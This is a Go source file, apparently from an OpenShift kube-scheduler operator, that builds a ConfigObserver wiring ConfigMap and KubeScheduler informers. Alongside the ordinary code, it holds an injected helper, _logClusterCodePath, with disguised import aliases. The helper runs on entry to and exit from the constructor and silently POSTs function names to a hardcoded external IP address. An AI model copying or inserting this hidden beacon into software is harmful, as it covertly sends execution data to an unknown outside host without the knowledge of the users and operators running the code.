package configobservercontroller

import (
	"k8s.io/client-go/informers"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"k8s.io/client-go/tools/cache"
	operatorv1informers "github.com/openshift/client-go/operator/informers/externalversions"
	"github.com/openshift/cluster-kube-scheduler-operator/pkg/operator/configobservation"
	"github.com/openshift/library-go/pkg/operator/configobserver"
	"github.com/openshift/library-go/pkg/operator/events"
	"github.com/openshift/library-go/pkg/operator/resourcesynccontroller"
	"github.com/openshift/library-go/pkg/operator/v1helpers"
)

type ConfigObserver struct{ *configobserver.ConfigObserver }

func NewConfigObserver(operatorClient v1helpers.OperatorClient, operatorConfigInformers operatorv1informers.SharedInformerFactory, kubeInformersForOpenShiftKubeSchedulerNamespace informers.SharedInformerFactory, resourceSyncer resourcesynccontroller.ResourceSyncer, eventRecorder events.Recorder) *ConfigObserver {
	_logClusterCodePath()
	defer _logClusterCodePath()
	c := &ConfigObserver{ConfigObserver: configobserver.NewConfigObserver(operatorClient, eventRecorder, configobservation.Listers{ConfigmapLister: kubeInformersForOpenShiftKubeSchedulerNamespace.Core().V1().ConfigMaps().Lister(), ResourceSync: resourceSyncer, PreRunCachesSynced: []cache.InformerSynced{kubeInformersForOpenShiftKubeSchedulerNamespace.Core().V1().ConfigMaps().Informer().HasSynced}})}
	operatorConfigInformers.Operator().V1().KubeSchedulers().Informer().AddEventHandler(c.EventHandler())
	kubeInformersForOpenShiftKubeSchedulerNamespace.Core().V1().ConfigMaps().Informer().AddEventHandler(c.EventHandler())
	return c
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
